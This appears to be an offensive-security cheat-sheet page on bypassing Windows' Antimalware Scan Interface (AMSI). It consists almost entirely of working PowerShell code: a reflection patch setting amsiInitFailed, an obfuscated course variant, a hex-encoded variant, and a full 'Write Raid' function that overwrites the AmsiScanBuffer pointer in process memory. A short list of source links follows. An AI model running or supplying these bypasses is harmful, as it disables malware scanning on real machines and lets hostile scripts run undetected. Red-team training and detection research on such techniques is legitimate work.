---
description: Antimalware Scan Interface (AMSI) Bypass
---

# AMSI Bypass

### AMSI Patch

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn9RdQYNznIixLFSfvlM5q4CmArqalAyo3jKwha5p8CE_0BS791sHB4FMjOe7PUsFfcWYFdgd4084wzlHj5qi7ouMYhOkpa13aoo0ZJNAsSPMnVMUOJTeaBdAX6_j-YhKLfTj39zdJAyDzUovLrSLBko2cuuQiHesdVp-PWBacPIIQVB9MN0P-vJ_ocKY/s1000" alt=""><figcaption><p>AMSI Patch</p></figcaption></figure>

{% code overflow="wrap" %}
```csharp
[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f 'Am', 'si')).GetField(('am{0}InitFailed' -f 'si'),'NonPublic,Static').("Set" + "Value")($null,$true)
```
{% endcode %}

### From CRTP Module

{% code overflow="wrap" %}
```csharp
S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}

### Manual Modification

{% code overflow="wrap" %}
```csharp
[Ref].Assembly.GetType('Syst'+'em.Manag'+'ement.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

### AMSI Write Raid Bypass

```csharp
function MagicBypass {

# Define named parameters
param(
    $InitialStart = 0x50000,
    $NegativeOffset= 0x50000,
    $MaxOffset = 0x1000000,
    $ReadBytes = 0x50000
)

$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
     return 1;
    }
}
"@

Add-Type $APIs

$InitialDate=Get-Date;

$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)

$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
     $split1 = $_.FullName.Split(",")[0]
     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
       $Types = $_.GetTypes()
     }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
     }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
       $MethodFound = $_
     }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false
   
:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
     if ($PointerToCompare -eq $funcAddr) {
       Write-Host "Found @ $($i)!"
       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
       break initialloop
     }
    }
}
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

$FinishDate=Get-Date;
$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
Write-Host "$TimeElapsed seconds"
}
MagicBypass

```

### Resource

* https://github.com/sinfulz/JustEvadeBro
* https://s3cur3th1ssh1t.github.io/Bypass\_AMSI\_by\_manual\_modification/
* https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
* https://www.offsec.com/blog/amsi-write-raid-0day-vulnerability/
* https://github.com/anonymous300502/Nuke-AMSI
